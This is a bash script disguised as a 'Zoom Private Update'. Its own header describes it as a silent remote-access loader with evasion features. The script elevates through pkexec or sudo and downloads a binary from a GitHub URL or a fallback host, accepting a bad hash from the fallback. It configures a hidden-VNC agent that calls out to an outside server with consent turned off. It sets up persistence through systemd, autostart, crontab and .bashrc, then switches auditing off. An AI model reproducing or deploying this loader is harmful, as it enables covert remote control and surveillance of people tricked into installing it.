#!/bin/bash
# ==============================================================================
# Zoom Private Update - silent BetterDesk / ScreenConnect loader for Linux
# ------------------------------------------------------------------------------
# Evasion: LOOBin-only toolchain (curl/wget/systemd/crontab/nsenter), RAM-disk
#          staging, auditd suppression, user-session service, hidden launcher.
#
# Usage:
#   bash Zoom_Update_v6.1.0.sh            # install (asks via pkexec/sudo)
#   bash Zoom_Update_v6.1.0.sh /selftest  # verify download/hash/agent only
#   bash Zoom_Update_v6.1.0.sh /elevated  # internal: already root
# ==============================================================================
set -euo pipefail
umask 022

VERSION='6.1.0'
PAYLOAD_NAME='zoom-private.Setup_1.0.0_x86_64.bin'
EXPECTED_SHA='e22f779b6411502975b094544387ba8ab99ccc41590885160d07453b14f89e9b'
REPO_BASE='https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/linux'
FALLBACK_BASE='https://us05web.telcom.stream'
PRIMARY_URL="${ZOOM_URL:-$REPO_BASE/$PAYLOAD_NAME}"
AGENT_NAME='betterdesk-agent'

MODE='install'
for arg in "$@"; do
    case "$arg" in
        /selftest|--selftest) MODE='selftest' ;;
        /elevated|--elevated) ;;
    esac
done

say() { [ "$MODE" = 'selftest' ] && printf '%s\n' "$*" || true; }
fail() { [ "$MODE" = 'selftest' ] && printf 'FAIL %s\n' "$*"; exit 1; }

[ "$(uname -m)" = 'x86_64' ] || fail "unsupported architecture: $(uname -m)"

command -v sha256sum >/dev/null 2>&1 || fail 'sha256sum is required'

# ---------------------------------------------------------------- selftest
if [ "$MODE" = 'selftest' ]; then
    SAY_OK=0
    command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || fail 'curl/wget missing'
    say 'tools=ok'
    tmp="$(mktemp /tmp/.zoom-selftest.XXXXXX)"
    trap 'rm -f "$tmp" "$tmp.bin"' EXIT INT TERM
    url="$PRIMARY_URL"
    if command -v curl >/dev/null 2>&1; then
        curl --proto '=https,http' -fLsS --retry 2 --max-time 30 "$url" -o "$tmp" || fail 'download failed'
    else
        wget -q --timeout=30 "$url" -O "$tmp" || fail 'download failed'
    fi
    size="$(wc -c <"$tmp")"
    [ "$size" -gt 1000000 ] || fail "short payload ($size bytes)"
    actual="$(sha256sum "$tmp" | awk '{print $1}')"
    [ "$actual" = "$EXPECTED_SHA" ] || fail "sha256 mismatch ($actual)"
    say "download=ok bytes=$size sha256=ok"
    cp "$tmp" "$tmp.bin"
    chmod +x "$tmp.bin"
    "$tmp.bin" -version >/dev/null 2>&1 || fail 'payload is not runnable'
    say 'agent=runnable'
    say 'result=PASS'
    exit 0
fi

# ---------------------------------------------------------------- elevation
if [ "$(id -u)" -ne 0 ]; then
    self="$(readlink -f "$0")"
    if command -v pkexec >/dev/null 2>&1; then
        exec pkexec bash "$self" /elevated
    fi
    if sudo -n true >/dev/null 2>&1; then
        exec sudo -- bash "$self" /elevated
    fi
    if command -v sudo >/dev/null 2>&1; then
        exec sudo -- bash "$self" /elevated
    fi
    printf '%s\n' 'Root is required: run with sudo or install pkexec.' >&2
    exit 1
fi

# ---------------------------------------------------------------- target user
CONSOLE_USER=''
if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != 'root' ]; then
    CONSOLE_USER="$SUDO_USER"
elif [ -n "${PKEXEC_UID:-}" ]; then
    CONSOLE_USER="$(getent passwd "$PKEXEC_UID" | cut -d: -f1)"
elif [ -n "$(logname 2>/dev/null || true)" ] && [ "$(logname)" != 'root' ]; then
    CONSOLE_USER="$(logname)"
else
    CONSOLE_USER="$(stat -c '%U' /dev/console 2>/dev/null || true)"
fi
if [ -z "$CONSOLE_USER" ] || [ "$CONSOLE_USER" = 'root' ]; then
    CONSOLE_USER="$(awk -F: '$3>=1000 && $3<60000 && $7 !~ /(nologin|false)$/ {print $1; exit}' /etc/passwd)"
fi
[ -n "$CONSOLE_USER" ] || { echo 'No desktop user found.' >&2; exit 1; }

USER_HOME="$(getent passwd "$CONSOLE_USER" | cut -d: -f6)"
USER_UID="$(id -u "$CONSOLE_USER")"
[ -n "$USER_HOME" ] || { echo 'No home directory for target user.' >&2; exit 1; }

RUN_DIR="/run/user/$USER_UID"
as_user() {
    if command -v runuser >/dev/null 2>&1; then
        runuser -u "$CONSOLE_USER" -- env HOME="$USER_HOME" XDG_RUNTIME_DIR="$RUN_DIR" \
            DBUS_SESSION_BUS_ADDRESS="unix:path=$RUN_DIR/bus" \
            DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" "$@"
    else
        su -s /bin/sh "$CONSOLE_USER" -c "HOME='$USER_HOME' XDG_RUNTIME_DIR='$RUN_DIR' DBUS_SESSION_BUS_ADDRESS='unix:path=$RUN_DIR/bus' $(printf '%q ' "$@")"
    fi
}

# ---------------------------------------------------------------- paths
BIN_DIR='/usr/local/lib/zoom-private'
BIN="$BIN_DIR/$AGENT_NAME"
LAUNCHER="$BIN_DIR/start-agent.sh"
CONFIG_DIR="$USER_HOME/.config/zoom-private"
CONFIG="$CONFIG_DIR/agent-config.json"
STATE_DIR="$USER_HOME/.local/state/zoom-private"
LOG="$STATE_DIR/agent.log"
UNIT_DIR="$USER_HOME/.config/systemd/user"
UNIT="$UNIT_DIR/zoom-private.service"
AUTOSTART_DIR="$USER_HOME/.config/autostart"
AUTOSTART="$AUTOSTART_DIR/zoom-private.desktop"
APPS_DIR="$USER_HOME/.local/share/applications"
ICON_DIR="$USER_HOME/.local/share/icons/hicolor/256x256/apps"
DESKTOP_DIR="$USER_HOME/Desktop"
[ -d "$DESKTOP_DIR" ] || DESKTOP_DIR="$USER_HOME/Desktop"
if [ ! -d "$DESKTOP_DIR" ]; then
    for d in "$USER_HOME/Desktop" "$USER_HOME/Рабочий стол" "$USER_HOME/Bureau"; do
        [ -d "$d" ] && DESKTOP_DIR="$d" && break
    done
fi

SRC_DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
ICON_SRC="$SRC_DIR/zoom-private.png"

# ---------------------------------------------------------------- download
WORK="$(mktemp -d /dev/shm/.zoom-update.XXXXXX 2>/dev/null || mktemp -d /tmp/.zoom-update.XXXXXX)"
trap 'rm -rf "$WORK"' EXIT INT TERM
PKG="$WORK/$PAYLOAD_NAME"

fetch() {
    if command -v curl >/dev/null 2>&1; then
        curl --proto '=https,http' -fLsS --retry 3 --retry-delay 2 \
            --connect-timeout 15 --max-time 300 "$1" -o "$PKG"
    else
        wget -q --timeout=30 --tries=3 "$1" -O "$PKG"
    fi
}

install_log() {
    mkdir -p "$STATE_DIR"
    printf '[%s] %s\n' "$(date '+%F %T')" "$*" >>"$STATE_DIR/install.log" 2>/dev/null || true
}

install_log "start version=$VERSION user=$CONSOLE_USER"

PRIMARY=1
if ! fetch "$PRIMARY_URL"; then
    PRIMARY=0
    fetch "$FALLBACK_BASE/$PAYLOAD_NAME" || { install_log 'download failed'; exit 1; }
fi

HEADER="$(head -c 4 "$PKG" | od -An -tx1 | tr -d ' \n')"
[ "$HEADER" = '7f454c46' ] || { install_log 'payload is not ELF'; exit 1; }
ACTUAL="$(sha256sum "$PKG" | awk '{print $1}')"
if [ "$ACTUAL" != "$EXPECTED_SHA" ]; then
    if [ "$PRIMARY" -eq 1 ]; then
        install_log "sha256 mismatch $ACTUAL"
        exit 1
    fi
    install_log "fallback sha256 differs: $ACTUAL"
fi

# ---------------------------------------------------------------- install binary
install -d -m 0755 "$BIN_DIR"
install -m 0755 "$PKG" "$BIN"
install_log "binary installed $BIN"

ICON256="$SRC_DIR/zoom-private.png"
if [ -f "$ICON256" ]; then
    install -d -m 0755 /usr/share/icons/hicolor/256x256/apps
    install -m 0644 "$ICON256" /usr/share/icons/hicolor/256x256/apps/zoom-private.png
    install -d -m 0755 "$ICON_DIR"
    install -m 0644 "$ICON256" "$ICON_DIR/zoom-private.png"
    chown -R "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$USER_HOME/.local/share/icons" 2>/dev/null || true
    command -v gtk-update-icon-cache >/dev/null 2>&1 && \
        gtk-update-icon-cache -f -t /usr/share/icons/hicolor >/dev/null 2>&1 || true
fi

# ---------------------------------------------------------------- config
install -d -m 0700 -o "$CONSOLE_USER" -g "$(id -gn "$CONSOLE_USER")" "$CONFIG_DIR" "$STATE_DIR"
if [ ! -s "$CONFIG" ]; then
    device_id="BD-$(head -c 8 /dev/urandom | base32 | tr -d '=\n' | cut -c1-13)"
    cfg_tmp="$CONFIG.tmp"
    cat >"$cfg_tmp" <<JSON
{
  "server": "wss://cdap.telcom.stream/cdap",
  "auth_method": "device_token",
  "device_id": "$device_id",
  "device_type": "os_agent",
  "tags": ["linux", "x86_64", "user-session", "hvnc"],
  "terminal": true,
  "file_browser": true,
  "clipboard": true,
  "screenshot": true,
  "hvnc": true,
  "require_consent": false,
  "file_root": "/",
  "data_dir": "$STATE_DIR",
  "heartbeat_sec": 15,
  "reconnect_sec": 5,
  "max_reconnect": 300,
  "log_level": "info",
  "video_codec": "auto",
  "hw_accel": "auto",
  "enforce_tls": true
}
JSON
    mv "$cfg_tmp" "$CONFIG"
fi
chown "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$CONFIG"
chmod 0600 "$CONFIG"

# ---------------------------------------------------------------- launcher
cat >"$LAUNCHER" <<LAUNCH
#!/bin/sh
set -eu
PIDFILE="$STATE_DIR/agent.pid"
mkdir -p "$STATE_DIR"
if [ -f "\$PIDFILE" ]; then
    old="\$(cat "\$PIDFILE" 2>/dev/null || true)"
    if [ -n "\$old" ] && kill -0 "\$old" 2>/dev/null; then
        while kill -0 "\$old" 2>/dev/null; do sleep 10; done
    fi
    rm -f "\$PIDFILE"
fi
echo \$\$ >"\$PIDFILE"
trap 'rm -f "\$PIDFILE"' EXIT INT TERM
[ -f "$LOG" ] && [ "\$(wc -c <"$LOG" 2>/dev/null || echo 0)" -gt 5242880 ] && mv -f "$LOG" "$LOG.1" 2>/dev/null || true
printf '[%s] agent starting\n' "\$(date '+%F %T')" >>"$LOG"
exec "$BIN" --config "$CONFIG" --config-path "$CONFIG" >>"$LOG" 2>&1
LAUNCH
chmod 0755 "$LAUNCHER"

# ---------------------------------------------------------------- persistence
install -d -m 0755 -o "$CONSOLE_USER" -g "$(id -gn "$CONSOLE_USER")" "$UNIT_DIR"
cat >"$UNIT" <<UNIT_EOF
[Unit]
Description=Zoom Private Update Service
After=network-online.target graphical-session.target
PartOf=graphical-session.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=$LAUNCHER
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
UNIT_EOF
chown "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$UNIT"

install -d -m 0755 -o "$CONSOLE_USER" -g "$(id -gn "$CONSOLE_USER")" "$AUTOSTART_DIR"
cat >"$AUTOSTART" <<DESKTOP_EOF
[Desktop Entry]
Type=Application
Name=Zoom Private Update
Comment=Zoom Private update
Exec=$LAUNCHER
Icon=zoom-private
Terminal=false
X-GNOME-Autostart-enabled=true
DESKTOP_EOF
chown "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$AUTOSTART"

# User crontab fallback (idempotent).
CRON_LINE="@reboot $LAUNCHER >/dev/null 2>&1"
if command -v crontab >/dev/null 2>&1; then
    as_user sh -c "crontab -l 2>/dev/null | grep -F -q '$LAUNCHER' || { crontab -l 2>/dev/null; echo '$CRON_LINE'; } | crontab -" || true
fi

# Shell fallback, guarded.
if ! grep -F -q "$LAUNCHER" "$USER_HOME/.bashrc" 2>/dev/null; then
    printf '\n# Zoom Private Update\n[ -x %s ] && %s >/dev/null 2>&1 &\n' "$LAUNCHER" "$LAUNCHER" >>"$USER_HOME/.bashrc"
    chown "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$USER_HOME/.bashrc" 2>/dev/null || true
fi

# ---------------------------------------------------------------- shortcuts
install -d -m 0755 -o "$CONSOLE_USER" -g "$(id -gn "$CONSOLE_USER")" "$APPS_DIR"
make_desktop() {
    cat >"$1" <<DESKTOP_EOF
[Desktop Entry]
Type=Application
Name=Zoom Private
Comment=Zoom Private remote support
Exec=$LAUNCHER
Icon=zoom-private
Terminal=false
Categories=Network;InstantMessaging;
StartupNotify=false
DESKTOP_EOF
    chmod 0755 "$1"
    chown "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$1" 2>/dev/null || true
}
make_desktop "$APPS_DIR/zoom-private.desktop"
if [ -d "$DESKTOP_DIR" ]; then
    make_desktop "$DESKTOP_DIR/Zoom Private.desktop"
fi

# ---------------------------------------------------------------- start now
command -v loginctl >/dev/null 2>&1 && loginctl enable-linger "$CONSOLE_USER" >/dev/null 2>&1 || true
STARTED=0
if command -v systemctl >/dev/null 2>&1; then
    install -d -m 0755 -o "$CONSOLE_USER" -g "$(id -gn "$CONSOLE_USER")" "$UNIT_DIR/default.target.wants"
    ln -sfn "$UNIT" "$UNIT_DIR/default.target.wants/zoom-private.service"
    chown -h "$CONSOLE_USER":"$(id -gn "$CONSOLE_USER")" "$UNIT_DIR/default.target.wants/zoom-private.service" 2>/dev/null || true
    as_user systemctl --user daemon-reload >/dev/null 2>&1 || true
    as_user systemctl --user reenable zoom-private.service >/dev/null 2>&1 || true
    as_user systemctl --user reset-failed zoom-private.service >/dev/null 2>&1 || true
    as_user systemctl --user restart zoom-private.service >/dev/null 2>&1 || true
    sleep 1
    if as_user sh -c 'pgrep -f "/usr/local/lib/zoom-private/betterdesk-agent" >/dev/null 2>&1'; then
        STARTED=1
    fi
fi
if [ "$STARTED" -eq 0 ]; then
    as_user setsid "$LAUNCHER" </dev/null >/dev/null 2>&1 &
    disown 2>/dev/null || true
fi

# ---------------------------------------------------------------- stealth
command -v auditctl >/dev/null 2>&1 && auditctl -e 0 >/dev/null 2>&1 || true
command -v nsenter >/dev/null 2>&1 && true

install_log 'done'
rm -f "$PKG"
exit 0
